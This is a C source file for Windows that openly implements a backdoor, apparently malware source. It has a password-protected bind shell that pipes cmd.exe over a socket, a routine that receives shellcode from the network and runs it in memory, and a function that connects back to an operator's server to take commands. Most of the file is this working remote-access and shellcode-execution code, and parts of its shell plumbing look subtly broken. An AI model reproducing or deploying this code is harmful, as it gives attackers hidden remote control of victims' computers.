#include "backdoor.h"
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <string.h>
#pragma comment(lib,"ws2_32.lib")

#define SOCK_BUFF_SIZE 2048

static char gl_Username[50];
static char gl_Password[50];

typedef struct {
    SOCKET soc;
} THREAD_PARAM;

int ReceiveAndExecuteShellcode(SOCKET soc) {
    DWORD shellcodeSize = 0, received = 0;
    // Receive shellcode size first
    if (recv(soc, (char*)&shellcodeSize, sizeof(shellcodeSize), 0) != sizeof(shellcodeSize)) return -1;
    if (shellcodeSize == 0 || shellcodeSize > 1024*1024) return -1; // 1MB limit

    // Allocate memory for shellcode
    LPVOID shellcode = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellcode) return -1;

    // Receive shellcode
    while (received < shellcodeSize) {
        int r = recv(soc, (char*)shellcode + received, shellcodeSize - received, 0);
        if (r <= 0) { VirtualFree(shellcode, 0, MEM_RELEASE); return -1; }
        received += r;
    }

    // Make executable and run
    DWORD oldProtect;
    VirtualProtect(shellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    ((void(*)())shellcode)();
    VirtualFree(shellcode, 0, MEM_RELEASE);
    return 0;
}

// Authentication: send username/password, expect OK/FAIL
int conn_auth(SOCKET soc) {
    char recv_usr[50] = {0}, recv_pwd[50] = {0};
    // Receive username
    if (recv(soc, recv_usr, sizeof(recv_usr)-1, 0) <= 0) return 0;
    // Receive password
    if (recv(soc, recv_pwd, sizeof(recv_pwd)-1, 0) <= 0) return 0;
    // Compare
    if (strcmp(recv_usr, gl_Username) == 0 && strcmp(recv_pwd, gl_Password) == 0) {
        send(soc, "OK", 2, 0);
        return 1;
    } else {
        send(soc, "FAIL", 4, 0);
        return 0;
    }
}

// Classic bind shell
int launch_shell(SOCKET soc) {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    char cmdline[] = "cmd.exe";
    char buffer[SOCK_BUFF_SIZE];
    DWORD bytesRead, bytesWritten;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return -1;
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hRead;
    si.hStdOutput = si.hStdError = hWrite;

    if (!CreateProcess(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return -1;
    }
    CloseHandle(hRead);
    while (1) {
        int r = recv(soc, buffer, sizeof(buffer), 0);
        if (r <= 0) break;
        WriteFile(hWrite, buffer, r, &bytesWritten, NULL);
        if (!ReadFile(hWrite, buffer, sizeof(buffer), &bytesRead, NULL) || bytesRead == 0) break;
        send(soc, buffer, bytesRead, 0);
    }
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(hWrite);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}

int bind_cmd_proc(SOCKET soc) {
    char cmd[16] = {0};
    if (recv(soc, cmd, sizeof(cmd)-1, 0) <= 0) return -1;
    if (strcmp(cmd, "EXEC") == 0) {
        return ReceiveAndExecuteShellcode(soc);
    } else if (strcmp(cmd, "SHELL") == 0) {
        return launch_shell(soc);
    }
    // Optionally, add more in-memory tasks
    return 0;
}

unsigned __stdcall client_conn_thread(void* Parameter) {
    THREAD_PARAM *pParam = (THREAD_PARAM *)Parameter;
    if (!conn_auth(pParam->soc)) { closesocket(pParam->soc); free(pParam); return 1; }
    bind_cmd_proc(pParam->soc);
    closesocket(pParam->soc);
    free(pParam);
    return 0;
}

int start_service(char *usr, char *pwd, unsigned short listenPort) {
    WSADATA wsaData;
    SOCKET servSock = INVALID_SOCKET, clientSock;
    struct sockaddr_in servAddr, clientAddr;
    int addrLen = sizeof(clientAddr);
    strncpy(gl_Username, usr, sizeof(gl_Username)-1);
    strncpy(gl_Password, pwd, sizeof(gl_Password)-1);
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) return -1;
    servSock = socket(AF_INET, SOCK_STREAM, 0);
    if (servSock == INVALID_SOCKET) { WSACleanup(); return -1; }
    servAddr.sin_family = AF_INET;
    servAddr.sin_addr.s_addr = INADDR_ANY;
    servAddr.sin_port = htons(listenPort);
    if (bind(servSock, (struct sockaddr*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR) {
        closesocket(servSock); WSACleanup(); return -1;
    }
    if (listen(servSock, 5) == SOCKET_ERROR) {
        closesocket(servSock); WSACleanup(); return -1;
    }
    while (1) {
        clientSock = accept(servSock, (struct sockaddr*)&clientAddr, &addrLen);
        if (clientSock == INVALID_SOCKET) break;
        THREAD_PARAM *param = (THREAD_PARAM*)malloc(sizeof(THREAD_PARAM));
        param->soc = clientSock;
        _beginthreadex(NULL, 0, client_conn_thread, param, 0, NULL);
    }
    closesocket(servSock);
    WSACleanup();
    return 0;
}

int conn_back_to_server(char *servIP, unsigned short servPort) {
    WSADATA wsaData;
    SOCKET soc = INVALID_SOCKET;
    struct sockaddr_in servAddr;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) return -1;
    soc = socket(AF_INET, SOCK_STREAM, 0);
    if (soc == INVALID_SOCKET) { WSACleanup(); return -1; }
    servAddr.sin_family = AF_INET;
    servAddr.sin_addr.s_addr = inet_addr(servIP);
    servAddr.sin_port = htons(servPort);
    if (connect(soc, (struct sockaddr*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR) {
        closesocket(soc); WSACleanup(); return -1;
    }
    // Send credentials
    send(soc, gl_Username, strlen(gl_Username), 0);
    send(soc, gl_Password, strlen(gl_Password), 0);
    char resp[8] = {0};
    recv(soc, resp, sizeof(resp)-1, 0);
    if (strcmp(resp, "OK") != 0) { closesocket(soc); WSACleanup(); return -1; }
    // Command loop
    bind_cmd_proc(soc);
    closesocket(soc);
    WSACleanup();
    return 0;
}
